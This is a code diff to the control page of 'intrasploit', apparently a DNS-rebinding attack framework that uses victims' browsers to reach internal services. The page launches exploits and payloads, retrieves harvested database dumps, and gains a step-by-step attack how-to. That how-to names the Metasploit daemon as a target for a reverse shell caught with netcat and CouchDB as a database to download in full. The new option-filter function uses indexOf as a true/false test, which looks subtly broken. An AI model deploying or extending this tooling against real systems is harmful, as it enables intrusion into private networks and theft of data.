@@ -121,7 +121,7 @@ function btn_get_dbdump(cid)	{
 	Network.request("GET", "/client/harvested/" + cid, null, function(xhr)	{
 		if(xhr.status == 200)	{
 			var obj = Misc.parse_network2default(xhr, {});
-			var str = JSON.stringify(obj);
+			var str = JSON.stringify(obj, null, 2);
 			str.replace(/</g,"&lt;").replace(/>/g,"&gt;")
 			document.getElementById("httpresponseresult").innerHTML = str;
 			send2log("Updated with dump from database");
@@ -145,10 +145,12 @@ function btn_launch_exploit(cid)	{
 		alert("DNS rebinding is not complete or was not successful");
 		return;
 	}
-	var options = saveOptions();
+	saveOptions();
+	var options = optionsModule(eid, pid);
 	Network.request_advanced("POST", "/client/exploit/" + cid + "/" + eid + "/" + pid,
 		JSON.stringify(options), function(xhr, method, resource, data, user, pass)	{
 			console.log(xhr);
+			send2log("Sent exploit request to server");
 		}
 	);
 }
@@ -218,14 +220,14 @@ function cb_get_service(xhr, method, resource, data, user, pass)	{
 	else	{
 		GLOBAL[cid]["attempts"] += 1;
 		console.log("Client has not found service yet: " + String(GLOBAL[cid]["attempts"]));
-		if(GLOBAL[cid]["attempts"] > 10)	{
+		if(GLOBAL[cid]["attempts"] > 20)	{
 			send2log("Failed to perform rebinding on " + GLOBAL[cid]["ip"] + ":" + GLOBAL[cid]["port"]);
 			updateClient(cid, null, null, null, "Failed");
 		}
 		else	{
 			window.setTimeout(function()	{
 				Network.request_advanced("GET", "/client/product/" + cid, null, cb_get_service);
-			}, 20000);
+			}, 10000);
 		}
 	}
 }
@@ -355,7 +357,7 @@ function addOptionSelect(selectid, v)	{
 // Clear the client table so it has zero rows after header
 function clearClientTable()	{
 	var table = document.getElementById("client_table");
-	table.innerHTML = "<tr><th>ID</th><th>IP</th><th>Port</th><th>Loaded code</th><th>DNS redirected</th><th>Exploit</th><th>Payload</th><th>Launch</th><th>Get HTTP response</th><th>Get DB dump</th></tr>";
+	table.innerHTML = "<tr><th>ID</th><th>IP</th><th>Port</th><th>Loaded code</th><th>DNS rebind</th><th>Exploit</th><th>Payload</th><th>Launch</th><th>HTTP response</th><th>DB dump</th></tr>";
 }
 
 function getSelected(id)	{
@@ -484,7 +486,7 @@ function addClient(id, ip, port, connected, dns)	{
 	btn2.type = "button";
 	btn2.setAttribute("class", "button safe");
 	btn2.setAttribute("onclick", "btn_get_response('" + id + "');");
-	btn2.value = "Get response";
+	btn2.value = "HTTP response";
 	td9.appendChild(btn2);
 
 	var td10 = document.createElement("td");	// get DB dump
@@ -493,7 +495,7 @@ function addClient(id, ip, port, connected, dns)	{
 	btn3.type = "button";
 	btn3.setAttribute("class", "button safe");
 	btn3.setAttribute("onclick", "btn_get_dbdump('" + id + "');");
-	btn3.value = "Get DB dump";
+	btn3.value = "DB dump";
 	td10.appendChild(btn3);
 
 
@@ -554,8 +556,12 @@ function saveOptions()	{
 	var table = document.getElementById("optionstable");
 	var inputs = table.getElementsByTagName("input");
 	for(var i = 0; i < inputs.length; i++)	{
-		OPTIONS[inputs[i].id]["value"] = inputs[i].value;
-		ret[inputs[i].id] = inputs[i].value;
+		var optval = inputs[i].value;
+		if(inputs[i].id.indexOf("LIST") == 0)	{
+			optval = optval.split(",");
+		}
+		OPTIONS[inputs[i].id]["value"] = optval;
+		ret[inputs[i].id] = optval;
 	}
 	return ret;
 }
@@ -605,6 +611,17 @@ function addOptionsModule(modid)	{
 			addOption(key);
 		}
 	}
+}
+
+function optionsModule(eid, pid)	{
+	var ret = {};
+	for(var key in OPTIONS)	{
+		if(OPTIONS[key]["modules"].indexOf(eid) || OPTIONS[key]["modules"].indexOf(pid))	{
+			ret[key] = OPTIONS[key]["value"];
+		}
+	}
+	console.log(ret);
+	return ret;
 }
 
 function moduleChanged(id, modtype)	{
@@ -845,16 +862,29 @@ th, td {
 		</div>
 		<br style="clear:both;" /><hr />
 		<div id="httresponse">
-			<h2>HTTP response</h2>
+			<h2>Reponse</h2>
 			<pre><code id="httpresponseresult"></code></pre>
 		</div>
 		<br style="clear:both;" /><hr />
 		<div id="howto">
 			<h2>Howto</h2>
 			<p>This page is used to demonstrate intrasploit and show how it works.</p>
+			<h3>Launch an attack</h3>
+			<p>The basic steps for launching an attack is described below:</p>
+			<ol>
+				<li>Perform IP scan or manually add IPs (localhost has already been added)</li>
+				<li>Choose IP and port and click DNS Rebind</li>
+				<li>When "DNS rebind" is set to "Ready", DNS rebinding has been successful.</li>
+				<li>Click "HTTP response" to get answer for service targeted.</li>
+				<li>Choose exploit and payload</li>
+				<li>If any options pop up, fill out the options. If option value start with list, you can seperate items with comma.</li>
+				<li>Click "Exploit".</li>
+				<li>You will not receive any notification when exploit is finished, but you can click "DB Dump" to get any data collected.</li>
+			</ol>
+			<h3>Vulnerable services</h3>
 			<p>A limited number of modules are available, so you might wand to set up some vulnerable services beforehand if you want something to test. Some examples are:
 				<ol>
-					<li><code>msfd -a 127.0.0.1 -q -f</code> - Metasploit's daemon can be attacked to get a remote shell (port 55554)</li>
+					<li><code>msfd -a 127.0.0.1 -q -f</code> - Metasploit's daemon can be attacked to get a remote shell (port 55554). You will get a reverse shell on the LHOST and LPORT specified, start a receiver with nc -nlp <LPORT>.</li>
 					<li><code>python3 -m http.server -b 127.0.0.1 8080</code> - A web server that can be attacked (port 8080)</li>
 					<li><code>sudo sudo docker run -p 127.0.0.1:5984:5984 couchdb</code> - CouchDB - can download entire DB (port 5984), you can populate some data with the following commands.
 						<ul>
